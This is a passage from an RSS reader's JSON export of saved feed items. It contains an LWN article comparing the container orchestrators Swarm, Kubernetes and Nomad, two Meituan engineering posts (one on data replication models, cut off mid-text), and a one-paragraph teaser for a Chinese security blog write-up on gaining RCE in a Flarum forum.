Jia X, Tan M, et al. Search to distill: Pearls are everywhere but not the eyes[C]//Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition. 2020: 7539-7548.</li><li>[12] Cai H, Zhu L, Han S. Proxylessnas: Direct neural architecture search on target task and hardware[J]. arXiv preprint arXiv:1812.00332, 2018.</li><li>[13] <a href=\"https://arxiv.org/abs/2205.09394\">https://arxiv.org/abs/2205.09394</a></li></ul><h2>招聘信息</h2><p>搜索推荐算法部/基础算法组是负责美团搜索研发的核心团队，使命是打造世界一流的搜索引擎，依托Deep Learning（深度学习）、NLP（自然语言处理）、Knowledge Graph（知识图谱）等技术，处理美团海量用户、商家、商品数据，不断加深对用户、场景、查询和服务的理解，高效地支撑形态各样的生活服务搜索，解决搜索结果的多业务混排、相关性、个性化等问题，给用户极致的搜索体验。搜索推荐算法部长期招聘搜索推荐算法专家，感兴趣的同学可以将简历发送至：tech@meituan.com（邮件主题：美团平台/搜索推荐算法部）。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "https://tttang.com/archive/1714/",
    "timestampUsec": "1660900905914047",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "从偶遇Flarum开始的RCE之旅",
    "author": ";phith0n",
    "published": 1660874700,
    "updated": 1660874700,
    "alternate": [
        {
            "href": "https://tttang.com/archive/1714/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>一次日常测试中，偶然遇到了一个Flarum搭建的论坛，并获得了其管理员账号。本来到这里已经可以算完成了任务，将漏洞报给具体负责的人就结束了，但是既然已经拿到了管理员账号，何不尝试一下RCE呢？</p>"
    },
    "origin": {
        "streamId": 45,
        "title": "跳跳糖 - 安全与分享社区",
        "htmlUrl": "https://tttang.com/",
        "feedUrl": "https://tttang.com/rss.xml"
    }
},
{
    "id": "905164",
    "timestampUsec": "1661274834205225",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "The container orchestrator landscape",
    "author": ";jake",
    "published": 1661272740,
    "updated": 1661272740,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/905164/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>August 23, 2022</p>\n           <p>This article was contributed by Jordan Webb</p>\n           </div>\n<p><a href=\"https://lwn.net/Articles/902049/\">Docker and other container\nengines</a> can greatly simplify many aspects of deploying a server-side\napplication, but numerous applications consist of more than one container.\nManaging a group of containers only gets harder as additional applications\nand services are deployed; this has led to the development of a class of\ntools called container orchestrators.  The best-known of these by far is <a href=\"https://kubernetes.io/\">Kubernetes</a>; the history of container\norchestration can \nbe divided into what came before it and what came after. </p>\n\n<p>The convenience offered by containers comes with some trade-offs;\nsomeone who adheres strictly to Docker's idea that <a href=\"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#decouple-applications\">each\nservice should have its own container</a> will end up running a large\nnumber of them.  Even a simple web interface to a database might require\nrunning separate containers for the database server and the\napplication; it might also include a separate container for a web server to\nhandle serving static files, a proxy server to terminate SSL/TLS connections, a\nkey-value store to serve as a cache, or even a second application container\nto handle background jobs and scheduled tasks.  </p>\n\n<p>An administrator who is responsible for several such applications will\nquickly find themselves wishing for a tool to make their job easier; this\nis where container orchestrators step in.  A container orchestrator is a\ntool that can manage a group of multiple containers as a single unit.\nInstead of operating on a single server, orchestrators allow combining\nmultiple servers into a cluster, and automatically distribute container\nworkloads among the cluster nodes.   </p>\n\n<h4>Docker Compose and Swarm</h4>\n\n<p><a href=\"https://github.com/docker/compose\">Docker Compose</a> is not\nquite an orchestrator, but it was Docker's first attempt to create a tool\nto make it easier to manage applications that are made out of several\ncontainers.  It consumes a <a href=\"https://docs.docker.com/compose/compose-file/\">YAML-formatted\nfile</a>, which \nis almost always named <tt>docker-compose.yml</tt>.  Compose reads this\nfile and uses the <a href=\"https://docs.docker.com/engine/api/\">Docker\nAPI</a> to create the resources that it declares; Compose also adds labels to\nall of the resources, so that they can be managed as a group after they are\ncreated.  In effect, it is an alternative to the <a href=\"https://docs.docker.com/engine/reference/commandline/cli/\">Docker\ncommand-line interface</a> (CLI) that operates on groups of containers.\nThree types of resources \ncan be defined in a Compose file: </p>\n\n<ul>\n\n<li> <tt>services</tt> contains declarations of containers to be\nlaunched. Each entry in <tt>services</tt> is equivalent to a\n<tt>docker run</tt> command.</li> \n\n<li> <tt>networks</tt> declares networks that can be attached to the\ncontainers defined in the Compose file. Each entry in <tt>networks</tt> is\nequivalent to a <tt>docker network create</tt> command.</li>\n\n<li> <tt>volumes</tt> defines named volumes that can be attached to the\ncontainers. In Docker parlance, a volume is persistent storage that is\nmounted into the container. Named volumes are managed by the Docker\ndaemon. Each entry in <tt>volumes</tt> is equivalent to a\n<tt>docker volume create</tt> command.</li>\n\n</ul>\n\n<p>Networks and volumes can be directly connected to networks and\nfilesystems on the host that Docker is running on, or they can be provided\nby a <a href=\"https://docs.docker.com/engine/extend/legacy_plugins/\">plugin</a>.\nNetwork plugins allow things like connecting containers to VPNs; a\nvolume plugin might allow storing a volume on an NFS server or an\nobject storage service.  </p>\n\n<p>Compose provides a much more convenient way to manage an application\nthat consists of multiple containers, but, at least in its original\nincarnation, it only worked with a single host; all of the containers that\nit created were run on the same machine.  To extend its reach across\nmultiple hosts, Docker introduced <a href=\"https://docs.docker.com/engine/swarm/\">Swarm mode</a> in 2016.  This\nis actually the second product from Docker to bear the name \"Swarm\" — a <a href=\"https://github.com/docker-archive/classicswarm\">product from 2014</a>\nimplemented a <a href=\"https://dockerlabs.collabnix.com/intermediate/swarm/difference-between-docker-swarm-vs-swarm-mode-vs-swarmkit.html\">completely\ndifferent approach</a> to running containers across multiple hosts, but it\nis no longer maintained.  It was replaced by <a href=\"https://github.com/moby/swarmkit\">SwarmKit</a>, which provides the\nunderpinnings of the current version of Docker Swarm.  </p>\n\n<p>Swarm mode is included in Docker; no additional software is required.\nCreating a cluster is a simple matter of running <a href=\"https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm/\"><tt>docker swarm init</tt></a>\non an initial node, and then <a href=\"https://docs.docker.com/engine/swarm/swarm-tutorial/add-nodes/\"><tt>docker swarm join</tt></a>\non each additional node to be added.  Swarm clusters contain\ntwo types of nodes.  Manager nodes provide an API to launch containers on\nthe cluster, and communicate with each other using a protocol based on the\n<a href=\"https://raft.github.io/\">Raft Consensus Algorithm</a> in order to\nsynchronize the state of the cluster across all managers.  Worker nodes do\nthe actual work of running containers.  It is unclear how large these\nclusters can be; Docker's documentation says that a cluster should have <a href=\"https://docs.docker.com/engine/swarm/how-swarm-mode-works/nodes/#manager-nodes\">no\nmore than 7 manager nodes</a> but does not specify a limit on the number of\nworker nodes.  Bridging container networks across nodes is built-in, but\nsharing storage between nodes is not; third-party volume plugins need to be\nused to provide shared persistent storage across nodes.  </p>\n\n<p>Services are deployed on a swarm using Compose files.  Swarm extended\nthe Compose format by adding a <a href=\"https://docs.docker.com/compose/compose-file/deploy/\"><tt>deploy</tt></a>\nkey to each service that specifies how many instances of the service should\nbe running and which nodes they should run on.  Unfortunately, this led to\na divergence between Compose and Swarm, which caused <a href=\"https://stackoverflow.com/questions/43099408/whats-the-difference-between-a-stack-file-and-a-compose-file\">some\nconfusion</a> because options like CPU and memory quotas needed to be\nspecified \nin different ways depending on which tool was being used.  During this\nperiod of divergence, a file intended for Swarm was referred to as a \"stack\nfile\" instead of a Compose file in an attempt to disambiguate the two;\nthankfully, these differences appear to have been smoothed over in the\ncurrent versions of Swarm and Compose, and any references to a stack file\nbeing distinct from a Compose file seem to have largely been scoured from\nthe Internet.  The Compose format now has an <a href=\"https://compose-spec.io/\">open specification</a> and its own <a href=\"https://github.com/compose-spec/\">GitHub organization</a> providing\nreference implementations.  </p>\n\n<p>There is some level of uncertainty about the future of Swarm.  It\nonce formed the backbone of a service called Docker Cloud, but the\nservice was <a href=\"https://web.archive.org/web/20200611102535/http://success.docker.com/article/cloud-migration\">suddenly\nshut down in 2018</a>.  It was also touted as a key feature of Docker's\nEnterprise Edition, but that product has since been <a href=\"https://www.mirantis.com/blog/mirantis-acquires-docker-enterprise-platform-business/\">sold\nto another company</a> and is now marketed as <a href=\"https://www.mirantis.com/software/mirantis-kubernetes-engine/\">Mirantis\n<em>Kubernetes</em> Engine</a>.  Meanwhile, recent versions of Compose have\ngained the ability to deploy containers to services hosted by <a href=\"https://docs.docker.com/cloud/ecs-integration/\">Amazon</a> and <a href=\"https://docs.docker.com/cloud/aci-integration/\">Microsoft</a>.  There\nhas been no deprecation announcement, but there also hasn't been any\nannouncement of any other type in recent memory; <a href=\"https://www.docker.com/search/?_sf_s=swarm\">searching for the word\n\"Swarm\" on Docker's website</a> only turns up passing mentions.  </p>\n\n<h4>Kubernetes</h4>\n\n<p>Kubernetes (sometimes known as k8s) is a project inspired by an internal\nGoogle tool called <a href=\"https://kubernetes.io/blog/2015/04/borg-predecessor-to-kubernetes/\">Borg</a>.\nKubernetes manages resources and coordinates running workloads on clusters\nof up to thousands of nodes; it dominates container orchestration like\nGoogle dominates search.  Google <a href=\"https://www.theinformation.com/articles/when-docker-said-no-to-google\">wanted\nto collaborate with Docker</a> on Kubernetes development in 2014, but Docker\ndecided to go its own way with Swarm.  Instead, Kubernetes grew up under\nthe auspices of the <a href=\"https://www.cncf.io/certification\">Cloud\nNative Computing Foundation</a> (CNCF).  By 2017, Kubernetes had grown so\npopular that Docker announced that it would be <a href=\"https://web.archive.org/web/20190923110648/https://blog.docker.com/2017/10/kubernetes-docker-platform-and-moby-project/\">integrated\ninto Docker's own product</a>.  </p>\n\n<p>Aside from its popularity, Kubernetes is primarily known for its <a href=\"https://www.jeffgeerling.com/blog/2018/kubernetes-complexity\">complexity</a>.\nSetting up a new cluster by hand is an <a href=\"https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/\">involved\ntask</a>, which requires the administrator to select and configure several\nthird-party components in addition to Kubernetes itself.  Much like the\nLinux kernel needs to be combined with additional software\nto make a complete operating system, Kubernetes is only an orchestrator and\nneeds to be combined with additional software to make a complete cluster.\nIt needs a\ncontainer engine to run its containers;  it also needs plugins for <a href=\"https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/network-plugins/\">networking</a>\nand <a href=\"https://kubernetes.io/docs/concepts/storage/persistent-volumes/\">persistent\nvolumes</a>.  </p>\n\n<p><a href=\"https://containerjournal.com/topics/container-ecosystems/kubernetes-distribution-what-it-is-and-what-it-isnt/\">Kubernetes\ndistributions</a> exist to fill this gap.  Like a Linux distribution, a\nKubernetes distribution bundles Kubernetes with an installer and a\ncurated selection of third-party components.  Different distributions\nexist to fill different niches; seemingly every tech company of a certain\nsize has its own distribution and/or hosted offering to cater to\nenterprises.  The <a href=\"https://minikube.sigs.k8s.io/docs/start/\">minikube</a> project offers\nan easier on-ramp for developers looking for a local environment to\nexperiment with.  Unlike their Linux counterparts, Kubernetes distributions are\n<a href=\"https://www.cncf.io/certification/software-conformance/\">certified\nfor conformance</a> by the CNCF; each distribution must implement the same\nbaseline of functionality in order to obtain the certification, which\nallows them to use\nthe \"Certified Kubernetes\" badge.  </p>\n\n<p>A Kubernetes cluster contains several software <a href=\"https://kubernetes.io/docs/concepts/overview/components/\">components</a>.\nEvery node in the cluster runs an agent called the <a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/\">kubelet</a>\nto maintain membership in the cluster and accept work from it, a container\nengine, and <a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/kube-proxy/\">kube-proxy</a>\nto enable network communication with containers running on other nodes.\n\n\n</p><p> The components that maintain the state of the cluster and make\ndecisions about resource allocations are collectively referred to as the\ncontrol plane — these include a distributed key-value store called <a href=\"https://etcd.io/\">etcd</a>, a scheduler that assigns work to cluster\nnodes, and one or more controller processes that react to changes in the\nstate of the cluster and trigger any actions needed to make the actual\nstate match the desired state.  Users and cluster nodes interact with the\ncontrol plane through the Kubernetes <a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/\">API\nserver</a>.  To effect changes, users set the desired state of the cluster\nthrough the API server, while the kubelet reports the actual state of each\ncluster node to the controller processes.  </p>\n\n<p>Kubernetes runs containers inside an abstraction called a <a href=\"https://kubernetes.io/docs/concepts/workloads/pods/\">pod</a>, which\ncan contain one or more containers, although running containers for more\nthan one service in a pod is discouraged.  Instead, a pod will generally\nhave a single main container that provides a service, and possibly one or\nmore \"sidecar\" containers that collect metrics or logs from the service\nrunning in the main container.  All of the containers in a pod will be\nscheduled together on the same machine, and will share a <a href=\"https://lwn.net/Articles/580893/\">network namespace</a> — containers\nrunning within the same pod can communicate with each other over the\nloopback interface.  Each pod receives its own unique IP address within\nthe cluster.  Containers running in different pods can communicate with\neach other using their cluster IP addresses.  </p>\n\n<p>A pod specifies a set of containers to run, but the definition of a pod\nsays nothing about where to run those containers, or how long to run them\nfor — without this information, Kubernetes will start the containers\nsomewhere on the cluster, but will not restart them when they exit, and may\nabruptly terminate them if the control plane decides the resources they are\nusing are needed by another workload.  For this reason, pods are rarely\nused alone; instead, the definition of a pod is usually wrapped in a <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/deployment/\">Deployment</a>\nobject, which is\nused to define a persistent service.  Like Compose\nand Swarm, the objects managed by Kubernetes are declared in YAML; for\nKubernetes, the YAML declarations are submitted to the cluster \nusing the <a href=\"https://kubernetes.io/docs/reference/kubectl/\"><tt>kubectl</tt></a>\ntool.  </p>\n\n<p>In addition to pods and\nDeployments, Kubernetes can <a href=\"https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.24/#-strong-api-groups-strong-\">manage\nmany other types of objects</a>, like load balancers and authorization\npolicies.  The list of supported APIs is continually evolving, and will vary\ndepending on which version of Kubernetes and which distribution a cluster is\nrunning.  <a href=\"https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\">Custom\nresources</a>\ncan be used to add APIs to a cluster to manage additional types of objects.\n<a href=\"https://kubevirt.io/\">KubeVirt</a> adds APIs to enable Kubernetes\nto run virtual machines, for example.  The complete list of APIs supported by a\nparticular cluster can be discovered with the <a href=\"https://jamesdefabia.github.io/docs/user-guide/kubectl/kubectl_api-versions/\"><tt>kubectl api-versions</tt></a> command.  </p>\n\n<p>Unlike Compose, each of these objects is declared in a separate YAML\ndocument, although multiple YAML documents can be inlined in the same file\nby separating them with \"<tt>---</tt>\", as seen in the <a href=\"https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/#organizing-resource-configurations\">Kubernetes\ndocumentation</a>.  A complex application might consist of many objects\nwith their definitions spread across multiple files; keeping all of these\ndefinitions in sync with each other when maintaining such an application\ncan be quite a chore.  In order to make this easier, some Kubernetes\nadministrators have turned to templating tools like <a href=\"https://jsonnet.org/articles/kubernetes.html\">Jsonnet</a>.  </p>\n\n<p><a href=\"https://helm.sh/\">Helm</a> takes the templating approach a step\nfurther.  Like Kubernetes, development of Helm takes place under the aegis\nof the CNCF; it is billed as \"the package manager for Kubernetes\".  Helm\ngenerates YAML configurations for Kubernetes from a collection of\ntemplates and variable declarations called a <a href=\"https://helm.sh/docs/topics/charts/\">chart</a>.  Its <a href=\"https://helm.sh/docs/chart_template_guide/#the-chart-template-developer-s-guide\">template\nlanguage</a> is distinct from the <a href=\"https://jinja.palletsprojects.com/en/3.1.x/\">Jinja</a> templates used\nby <a href=\"https://www.ansible.com/\">Ansible</a> but looks fairly similar\nto them; people who are familiar with <a href=\"https://docs.ansible.com/ansible/latest/user_guide/playbooks_reuse_roles.html\">Ansible\nRoles</a> will likely feel at home with Helm Charts.  \n</p>\n\n<p> Collections of Helm charts can be published in <a href=\"https://helm.sh/docs/topics/chart_repository/\">Helm repositories</a>;\n<a href=\"https://artifacthub.io/\">Artifact Hub</a> provides a large directory of\npublic Helm repositories.  Administrators can add these repositories to\ntheir Helm configuration and use the ready-made Helm charts to deploy\nprepackaged versions of popular applications to their cluster.  Recent\nversions of Helm also support pushing and pulling charts to and from\n<a href=\"https://helm.sh/docs/topics/registries/\">container registries</a>,\ngiving \nadministrators the option to store charts in the same place that they store\ncontainer images.  </p>\n\n<p>Kubernetes shows no signs of losing momentum any time soon.  It is\ndesigned to manage any type of resource; this flexibility, as demonstrated\nby the KubeVirt virtual-machine controller,  gives it the\npotential to remain relevant even if containerized workloads should\neventually fall out of favor.  Development proceeds at a healthy clip and\nnew <a href=\"https://kubernetes.io/releases/\">major releases come out\nregularly</a>.  Releases are supported for a year; there doesn't seem to be\na long-term support version available.  <a href=\"https://kubernetes.io/docs/tasks/administer-cluster/cluster-upgrade/\">Upgrading\na cluster</a> is supported, but some prefer to <a href=\"https://aws.amazon.com/blogs/containers/kubernetes-cluster-upgrade-the-blue-green-deployment-strategy/\">bring\nup a new cluster</a> and migrate their services over to it.  </p>\n\n<h4>Nomad</h4>\n\n<p><a href=\"https://www.hashicorp.com/products/nomad\">Nomad</a> is an\norchestrator from <a href=\"https://www.hashicorp.com/\">HashiCorp</a>, which\nis marketed as a simpler alternative to Kubernetes.  Nomad is an <a href=\"https://github.com/hashicorp/nomad\">open source\nproject</a>, like Docker and Kubernetes. It consists of a single\nbinary called <tt>nomad</tt>, which can be used to start a daemon\ncalled the agent and also serves as a <a href=\"https://www.nomadproject.io/docs/commands\">CLI</a> to communicate\nwith an agent.  Depending on how it is configured, the agent process can\nrun in one of two modes.  Agents running in server mode accept jobs and\nallocate cluster resources for them.  Agents running in client mode contact\nthe servers to receive jobs, run them, and report their status back to the\nservers.  The agent can also run in development mode, where it takes on the\nrole of both client and server to form a single-node cluster that can be\nused for testing purposes.  </p>\n\n<p><a href=\"https://learn.hashicorp.com/tutorials/nomad/clustering\">Creating a\nNomad cluster</a> can be quite simple.  In Nomad's most basic mode of operation,\nthe initial server agent must be started, then additional nodes can be added to\nthe cluster using the <a href=\"https://www.nomadproject.io/docs/commands/server/join\"><tt>nomad server join</tt></a>\ncommand.  HashiCorp also provides <a href=\"https://www.consul.io/\">Consul</a>, which is a general-purpose\nservice mesh and discovery tool.  While it can be used standalone, Nomad is\nprobably at its best when used in combination with Consul. The Nomad agent\ncan use Consul to automatically discover and join a cluster, and\ncan also perform health checks, serve DNS records, and provide HTTPS\nproxies to services running on the cluster.  </p>\n\n<p>Nomad supports complex cluster topologies.  Each cluster is divided into\none or more \"data centers\".  Like Swarm, server agents within a single\ndata center communicate with each other using a <a href=\"https://www.nomadproject.io/docs/concepts/consensus\">protocol</a>\nbased on Raft; this protocol has <a href=\"https://www.nomadproject.io/docs/install/production/requirements#network-topology\">tight\nlatency requirements</a>, but multiple data centers may be <a href=\"https://www.nomadproject.io/docs/concepts/architecture#high-level-overview\">linked\ntogether</a> using a <a href=\"https://www.nomadproject.io/docs/concepts/gossip\">gossip protocol</a>\nthat allows information to propagate through the cluster without each\nserver having to maintain a direct connection to every other.\nData centers linked together in this way can act as one cluster from a\nuser's perspective.  This architecture gives Nomad an advantage when scaled\nup to enormous clusters.  Kubernetes officially supports <a href=\"https://kubernetes.io/docs/setup/best-practices/cluster-large/\">up to\n5,000 nodes and 300,000 containers</a>, whereas Nomad's documentation cites\nexample of clusters containing <a href=\"https://www.nomadproject.io/docs/nomad-vs-kubernetes#scalability\">over\n10,000 nodes</a> and <a href=\"https://www.hashicorp.com/c2m\">2,000,000\ncontainers</a>.  </p>\n\n<p>Like Kubernetes, Nomad doesn't include a container engine or runtime.\nIt uses <a href=\"https://www.nomadproject.io/docs/drivers\">task drivers</a>\nto run jobs.  Task drivers that use <a href=\"https://www.nomadproject.io/docs/drivers/docker\">Docker</a> and <a href=\"https://www.nomadproject.io/plugins/drivers/podman\">Podman</a> to run\ncontainers are included; community-supported drivers are available for\nother container engines.  Also like Kubernetes, Nomad's ambitions are not\nlimited to containers; there are also task drivers for other types of\nworkloads, including a <a href=\"https://www.nomadproject.io/docs/drivers/raw_exec\">fork/exec\ndriver</a> that \nsimply runs a command on the host, a <a href=\"https://www.nomadproject.io/docs/drivers/qemu\">QEMU driver</a> for\nrunning virtual machines, and a <a href=\"https://www.nomadproject.io/docs/drivers/java\">Java driver</a> for\nlaunching Java applications.  <a href=\"https://www.nomadproject.io/plugins/drivers/community\">Community-supported\ntask drivers</a> connect Nomad to other types of workloads.  </p>\n\n<p>Unlike Docker or Kubernetes, Nomad eschews YAML in favor of <a href=\"https://github.com/hashicorp/hcl\">HashiCorp Configuration\nLanguage</a> (HCL), which was originally created for another HashiCorp\nproject for provisioning cloud resources called <a href=\"https://www.terraform.io/\">Terraform</a>. HCL is used across the\nHashiCorp \nproduct line, although it has limited\nadoption elsewhere.  Documents written in HCL can easily be converted\nto JSON, but it aims to provide a syntax that is more finger-friendly than\nJSON and less <a href=\"https://noyaml.com/\">error-prone</a> than YAML.\n</p>\n\n<p>HashiCorp's equivalent to Helm is called <a href=\"https://learn.hashicorp.com/tutorials/nomad/nomad-pack-intro?in=nomad%2Fnomad-pack\">Nomad\nPack</a>.  Like Helm, Nomad Pack processes a directory full of templates\nand variable declarations to generate job configurations.  Nomad also has a\n<a href=\"https://github.com/hashicorp/nomad-pack-community-registry\">community\nregistry</a> of pre-packaged applications, but the selection is <a href=\"https://github.com/hashicorp/nomad-pack-community-registry/tree/main/packs\">much\nsmaller</a> than what is available for Helm at Artifact Hub.  </p>\n\n<p>Nomad does not have the same level of popularity as Kubernetes.  Like\nSwarm, its development appears to be primarily driven by its creators;\nalthough it has been deployed by <a href=\"https://www.nomadproject.io/docs/who-uses-nomad\">many large\ncompanies</a>, HashiCorp is still very much the center of the community\naround Nomad.  At this point, it seems unlikely the project has gained\nenough momentum to have a life independent from its corporate parent.\nUsers can perhaps find assurance in the fact that HashiCorp is much more\nclearly committed to the development and promotion of Nomad than Docker is\nto Swarm.  </p>\n\n<h4>Conclusion</h4>\n\n<p>Swarm, Kubernetes, and Nomad are not the only container orchestrators,\nbut they are the three most viable.  <a href=\"https://mesos.apache.org/\">Apache Mesos</a> can also be used to run\ncontainers, but it was <a href=\"https://lists.apache.org/thread/ysvw7bb1rd8p88fk32okkzr75mscdjo8\">nearly\nmothballed</a> in 2021; <a href=\"https://dcos.io/\">DC/OS</a> is based on\nMesos, but much like Docker Enterprise Edition, the company that backed its\ndevelopment is now <a href=\"https://d2iq.com/\">focused on Kubernetes</a>.\nMost \"other\" container orchestration projects, like <a href=\"https://www.redhat.com/en/technologies/cloud-computing/openshift\">OpenShift</a>\nand <a href=\"https://rancher.com/\">Rancher</a>, are actually just enhanced\n(and certified) Kubernetes distributions, even if they don't have\nKubernetes in their name. \n</p>\n\n<p> Despite (or perhaps, <a href=\"https://www.appvia.io/blog/why-is-kubernetes-so-complicated\">because\nof</a>) its \ncomplexity, Kubernetes currently enjoys the most popularity by far, but\nHashiCorp's successes with Nomad show that there is still room for\nalternatives.  Some users remain loyal to the simplicity of Docker Swarm,\nbut its \nfuture is uncertain.  Other alternatives appear to be largely abandoned at\nthis point.\nIt would seem that the landscape has largely settled around these three\nplayers, but container orchestration is a still a\nrelatively immature area.  Ten years ago, very little of this technology even\nexisted, and things are still evolving quickly.  There are likely many\nexciting new ideas and developments in container orchestration that are\nstill to come. \n</p>\n\n\n<p>[Special thanks to Guinevere Saenger for educating me with regard to\nsome of the finer points of Kubernetes and providing some important\ncorrections for this article.]</p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Webb_Jordan\">Webb, Jordan</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://tech.meituan.com/2022/08/25/replication-in-meituan-01.html",
    "timestampUsec": "1661501646081541",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Replication（上）：常见复制模型&amp;分布式系统挑战",
    "author": ";美团技术团队",
    "published": 1661385600,
    "updated": 1661385600,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/08/25/replication-in-meituan-01.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>本系列文章分上下两篇，以《数据密集型应用系统设计（DDIA）》（下文简称《DDIA》）为主线，文中的核心理论讲解与图片来自于此书。在此基础上，加入了日常工作中对这些概念的理解与个性化的思考，并将它们映射到Kafka中，跟大家分享一下如何将具体的理论应用于实际生产环境中。</p><h2>1. 简介</h2><h3>1.1 简介——使用复制的目的</h3><p>在分布式系统中，数据通常需要被分散在多台机器上，主要为了达到以下目的：</p><ol><li>扩展性，数据量因读写负载巨大，一台机器无法承载，数据分散在多台机器上可以有效地进行负载均衡，达到灵活的横向扩展。</li><li><p>容错、高可用，在分布式系统中，单机故障是常态，在单机故障下仍然希望系统能够正常工作，这时候就需要数据在多台机器上做冗余，在遇到单机故障时其他机器就可以及时接管。</p></li><li><p>统一的用户体验，如果系统客户端分布在多个地域，通常考虑在多个地域部署服务，以方便用户能够就近访问到他们所需要的数据，获得统一的用户体验。</p></li></ol><p>数据的多机分布的方式主要有两种，一种是将数据分片保存，每个机器保存数据的部分分片（Kafka中称为Partition，其他部分系统称为Shard），另一种则是完全的冗余，其中每一份数据叫做一个副本（Kafka中称为Replica），通过数据复制技术实现。在分布式系统中，两种方式通常会共同使用，最后的数据分布往往是下图的样子，一台机器上会保存不同数据分片的若干个副本。本系列博文主要介绍的是数据如何做复制，分区则是另一个主题，不在本文的讨论范畴。</p><p><img src=\"https://p0.meituan.net/travelcube/1a0f88b2d8ff9019da609b765bc7eaca34503.png\" alt=\"图1 常见数据分布\" referrerpolicy=\"no-referrer\"></p><p>复制的目标需要保证若干个副本上的数据是一致的，这里的“一致”是一个十分不确定的词，既可以是不同副本上的数据在任何时刻都保持完全一致，也可以是不同客户端不同时刻访问到的数据保持一致。一致性的强弱也会不同，有可能需要任何时候不同客端都能访问到相同的新的数据，也有可能是不同客户端某一时刻访问的数据不相同，但在一段时间后可以访问到相同的数据。因此，“一致性”是一个值得单独抽出来细说的词。在下一篇文章中，我们将重点介绍这个词在不同上下文之间的含义。</p><p>此时，大家可能会有疑问，直接让所有副本在任意时刻都保持一致不就行了，为啥还要有各种不同的一致性呢？我们认为有两个考量点，第一是性能，第二则是复杂性。</p><p><strong>性能</strong>比较好理解，因为冗余的目的不完全是为了高可用，还有延迟和负载均衡这类提升性能的目的，如果只一味地为了地强调数据一致，可能得不偿失。<strong>复杂性</strong>是因为分布式系统中，有着比单机系统更加复杂的不确定性，节点之间由于采用不大可靠的网络进行传输，并且不能共享统一的一套系统时间和内存地址（后文会详细进行说明），这使得原本在一些单机系统上很简单的事情，在转到分布式系统上以后就变得异常复杂。这种复杂性和不确定性甚至会让我们怀疑，这些副本上的数据真的能达成一致吗？下一篇文章会专门详细分析如何设计算法来应对这种复杂和不确定性。</p><h3>1.2 文章系列概述</h3><p>本系列博文将分为上下两篇，第一篇将主要介绍几种常见的数据复制模型，然后介绍分布式系统的挑战，让大家对分布式系统一些稀奇古怪的故障有一些感性的认识。</p><p>第二篇文章将针对本篇中提到的问题，分别介绍事务、分布式共识算法和一致性，以及三者的内在联系，再分享如何在分布式系统中保证数据的一致性，进而让大家对数据复制技术有一个较为全面的认识。此外，本系列还将介绍业界验证分布式算法正确性的一些工具和框架。接下来，让我们一起开始数据复制之旅吧！</p><h2>2. 数据复制模式</h2><p>总体而言，最常见的复制模式有三种，分别为主从模式、多主节点模式、无主节点模式，下面分别进行介绍。</p><h3>2.1 最简单的复制模式——主从模式</h3><h4>简介</h4><p>对复制而言，最直观的方法就是将副本赋予不同的角色，其中有一个主副本，主副本将数据存储在本地后，将数据更改作为日志，或者以更改流的方式发到各个从副本（后文也会称节点）中。在这种模式下，所有写请求就全部会写入到主节点上，读请求既可以由主副本承担也可以由从副本承担，这样对于读请求而言就具备了扩展性，并进行了负载均衡。但这里面存在一个权衡点，就是客户端视角看到的一致性问题。这个权衡点存在的核心在于，数据传输是通过网络传递的，数据在网络中传输的时间是不能忽略的。</p><p><img src=\"https://p0.meituan.net/travelcube/c6a4c47606226ed3664c162796d0006482842.png\" alt=\"图2 同步复制与异步复制\" 